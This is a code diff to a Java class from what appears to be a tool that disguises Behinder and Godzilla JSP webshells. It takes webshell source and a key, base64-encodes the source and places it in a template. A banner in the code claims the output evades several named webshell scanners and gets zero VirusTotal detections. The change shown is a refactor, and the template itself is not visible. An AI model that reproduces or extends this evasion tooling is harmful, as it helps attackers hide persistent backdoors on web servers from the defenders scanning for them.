@@ -2,8 +2,6 @@ package encode;
 
 import application.RandomString;
 import org.apache.jasper.JspC;
-import org.apache.tomcat.JarScanFilter;
-
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
@@ -15,7 +13,7 @@ public class JspEncodeDemo1 {
     String key;
     String sourcecode;
     String encode;
-    String demo1txt;
+    String demotxt;
 
     public JspEncodeDemo1() {
     }
@@ -25,9 +23,17 @@ public class JspEncodeDemo1 {
         this.key = key;
         this.sourcecode = code;
     }
-    public String[] Run() throws Exception {
 
+    public static String GetDemotxt(){
 
+        return "/*\n" +
+                " * By: XG小刚\n" +
+                " * Time: 2023-10-16_jspdemo1\n" +
+                " * Bypass: 河马在线、河马本地(1.8.2)、D盾(2.1.7)、WEBDIR+、微步(安全)、VT(0红)、\n" +
+                " */";
+    }
+
+    public String Run() throws Exception {
 
         if(!sourcecode.isEmpty()){
             try {
@@ -73,18 +79,13 @@ public class JspEncodeDemo1 {
                 encode = encode.replace("$key$",this.key);
                 encode = encode.replace("$base64code$",jspsource);
 
-                demo1txt = "/*\n" +
-                        " * By: XG小刚\n" +
-                        " * Time: 2023-10-16_jspdemo1\n" +
-                        " * Bypass: 河马在线、河马本地(1.8.2)、D盾(2.1.7)、WEBDIR+、微步(安全)、VT(0红)、\n" +
-                        " */";
                 deleteDir("./cache/");
-                return new String[]{this.encode,this.demo1txt};
+                return this.encode;
             }catch (Exception e){
-                return new String[]{"加密失败",this.demo1txt};
+                return "加密失败";
             }
         }else {
-            return new String[]{"请输入冰蝎、哥斯拉JSP源码",this.demo1txt};
+            return "请输入冰蝎、哥斯拉JSP源码";
         }
 
     }
